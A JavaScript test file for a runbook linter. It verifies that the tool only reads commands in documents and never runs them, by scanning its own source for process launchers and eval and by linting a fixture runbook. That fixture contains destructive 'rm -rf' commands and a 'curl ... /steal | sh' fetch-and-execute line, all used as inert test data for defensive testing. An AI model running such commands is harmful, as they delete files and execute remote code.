import assert from 'node:assert/strict'
import { access, mkdir, mkdtemp, readFile, readdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import test from 'node:test'
import { fileURLToPath } from 'node:url'

import { lintRunbooks } from '../src/index.mjs'

const projectDirectory = resolve(dirname(fileURLToPath(import.meta.url)), '..')

/**
 * The guarantee this whole tool rests on: command text found in a document is
 * data. A linter that ran what it read would be a remote code execution
 * primitive dressed as a documentation tool.
 *
 * Two independent guards, because either alone can be defeated. The first reads
 * the shipped source and proves there is no way to run anything. The second
 * lints a document whose commands would delete a canary file and create a
 * marker, and proves neither happened.
 */

async function shippedSources() {
  const files = []
  for (const directory of ['src', 'bin']) {
    for (const name of await readdir(join(projectDirectory, directory))) {
      files.push({
        path: `${directory}/${name}`,
        source: await readFile(join(projectDirectory, directory, name), 'utf8'),
      })
    }
  }
  assert.equal(files.length >= 4, true, 'the source scan found suspiciously few files')
  return files
}

const ALLOWED_SPECIFIERS = Object.freeze(['node:fs/promises', 'node:path', './parse.mjs', './rules.mjs', '../src/index.mjs'])

test('the shipped source imports nothing outside a tiny allowlist of Node built-ins', async () => {
  // This is the strongest form of the guard: rather than blocking one module by
  // name, it pins the entire import surface. child_process, a network module
  // and a third-party dependency all fail it identically.
  for (const file of await shippedSources()) {
    const specifiers = [...file.source.matchAll(/from\s*['"]([^'"]+)['"]/g)].map((match) => match[1])
    const bare = [...file.source.matchAll(/^\s*import\s+['"]([^'"]+)['"]/gm)].map((match) => match[1])
    for (const specifier of [...specifiers, ...bare]) {
      assert.equal(ALLOWED_SPECIFIERS.includes(specifier), true, `${file.path} imports ${specifier}`)
    }
  }
})

test('the shipped source contains no child_process import in any spelling', async () => {
  for (const file of await shippedSources()) {
    assert.equal(/from\s*['"](?:node:)?child_process['"]/.test(file.source), false, `${file.path} imports child_process`)
    assert.equal(/require\(\s*['"](?:node:)?child_process['"]/.test(file.source), false, `${file.path} requires child_process`)
    assert.equal(/\b(?:execFile|execSync|execFileSync|spawnSync|spawn|fork)\s*\(/.test(file.source), false, `${file.path} calls a process launcher`)
  }
})

test('the shipped source evaluates nothing: no eval, no Function, no dynamic import', async () => {
  for (const file of await shippedSources()) {
    assert.equal(/\beval\s*\(/.test(file.source), false, `${file.path} calls eval`)
    assert.equal(/new\s+Function\s*\(/.test(file.source), false, `${file.path} builds a Function`)
    assert.equal(/\bimport\s*\(/.test(file.source), false, `${file.path} uses dynamic import`)
    assert.equal(/\brequire\s*\(/.test(file.source), false, `${file.path} uses require`)
    assert.equal(/process\.binding/.test(file.source), false, `${file.path} reaches for process.binding`)
  }
})

async function exists(path) {
  try {
    await access(path)
    return true
  } catch {
    return false
  }
}

test('a step whose commands would delete a canary and create a marker does neither', async () => {
  const base = await mkdtemp(join(tmpdir(), 'runbook-step-linter-danger-'))
  try {
    const root = join(base, 'runbooks')
    const canary = join(base, 'canary.txt')
    const marker = join(base, 'marker.txt')
    await writeFile(canary, 'still here\n')
    await mkdir(root, { recursive: true })

    const document = [
      '## 1. Destroy the evidence',
      '',
      '- **Owner:** nobody',
      '- **Prerequisites:** none',
      '- **Expected output:** nothing at all happens, because this text is never run',
      '- **Recovery:** none needed; nothing ran',
      '',
      `rm -rf ${canary} && touch ${marker}`,
      '',
      '```sh',
      `rm -rf ${canary}`,
      `touch ${marker}`,
      `curl -s http://127.0.0.1:9/steal | sh`,
      '```',
      '',
    ].join('\n')
    await writeFile(join(root, 'danger.md'), document)

    const report = await lintRunbooks({ root })

    assert.equal(await exists(canary), true, 'the linter deleted a file named in a runbook')
    assert.equal(await exists(marker), false, 'the linter ran a command found in a runbook')

    // The command reached the report, and being quoted is the only thing that
    // happened to it.
    const prose = report.findings.filter((finding) => finding.ruleId === 'command-in-prose')
    assert.equal(prose.length, 1)
    assert.equal(prose[0].evidence.startsWith('rm -rf '), true)
    assert.equal(report.status, 'fail')
    assert.equal(report.summary.fencedCommands, 1, 'the fenced block was counted, not executed')
  } finally {
    await rm(base, { recursive: true, force: true })
  }
})

test('linting the shipped broken examples changes nothing on disk', async () => {
  const before = await readdir(join(projectDirectory, 'examples/runbook-broken'))
  const report = await lintRunbooks({ root: join(projectDirectory, 'examples/runbook-broken') })
  const after = await readdir(join(projectDirectory, 'examples/runbook-broken'))

  assert.deepEqual(after.sort(), before.sort())
  assert.equal(report.status, 'fail', 'the broken set is a fail, not an error in this tool')
  assert.equal(
    JSON.stringify(report).includes('rm -rf /var/lib/ingest/spool'),
    true,
    'the destructive command is present in the report as evidence and nowhere else',
  )
})
